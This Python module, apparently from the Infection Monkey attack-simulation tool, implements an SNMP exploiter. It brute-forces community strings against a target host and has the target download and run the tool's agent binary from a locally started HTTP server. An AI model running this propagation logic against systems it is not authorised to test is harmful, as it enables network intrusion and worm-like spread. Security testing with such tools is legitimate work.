from logging import getLogger
from typing import Callable, Iterable, Sequence

from common.types import AgentID, Event
from infection_monkey.exploit import IAgentOTPProvider
from infection_monkey.exploit.tools import HTTPBytesServer
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.utils.threading import interruptible_iter

from .snmp_command_builder import build_snmp_command
from .snmp_exploit_client import SNMPExploitClient

logger = getLogger(__name__)

AgentBinaryServerFactory = Callable[[TargetHost], HTTPBytesServer]
CommunityStringGenerator = Callable[[], Iterable[str]]


class StubSNMPOptions:
    def __init__(self, *args, **kwargs):
        pass


class SNMPExploiter:
    def __init__(
        self,
        agent_id: AgentID,
        exploit_client: SNMPExploitClient,
        agent_binary_server_factory: AgentBinaryServerFactory,
        generate_community_strings: CommunityStringGenerator,
        otp_provider: IAgentOTPProvider,
    ):
        self._agent_id = agent_id
        self._exploit_client = exploit_client
        self._agent_binary_server_factory = agent_binary_server_factory
        self._generate_community_strings = generate_community_strings
        self._otp_provider = otp_provider

    def exploit_host(
        self,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: StubSNMPOptions,
        interrupt: Event,
    ) -> ExploiterResultData:
        try:
            logger.debug("Starting the agent binary server")
            agent_binary_http_server = self._agent_binary_server_factory(host)
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to start the agent binary HTTP "
                f"server: {err}"
            )
            logger.exception(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        command = build_snmp_command(
            self._agent_id,
            host,
            servers,
            current_depth,
            agent_binary_http_server.download_url,
            self._otp_provider.get_otp(),
        )

        try:
            return self._brute_force_exploit_host(
                host,
                options,
                command,
                agent_binary_http_server.bytes_downloaded,
                interrupt,
            )
        except Exception as err:
            msg = f"An unexpected exception occurred while exploiting host {host} with SNMP: {err}"
            logger.exception(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )
        finally:
            _stop_agent_binary_http_server(agent_binary_http_server)

    def _brute_force_exploit_host(
        self,
        host: TargetHost,
        options: StubSNMPOptions,
        command: str,
        agent_binary_downloaded: Event,
        interrupt: Event,
    ) -> ExploiterResultData:
        exploit_result = ExploiterResultData(exploitation_success=False, propagation_success=False)

        for community_string in interruptible_iter(self._generate_community_strings(), interrupt):
            (
                exploit_result.exploitation_success,
                exploit_result.propagation_success,
            ) = self._exploit_client.exploit_host(
                host,
                community_string,
                command,
                agent_binary_downloaded,
            )

            if exploit_result.exploitation_success:
                break

        return exploit_result


def _stop_agent_binary_http_server(agent_binary_http_server: HTTPBytesServer):
    try:
        logger.debug("Stopping the agent binary server")
        agent_binary_http_server.stop()
    except Exception:
        logger.exception("An unexpected error occurred while stopping the HTTP server")
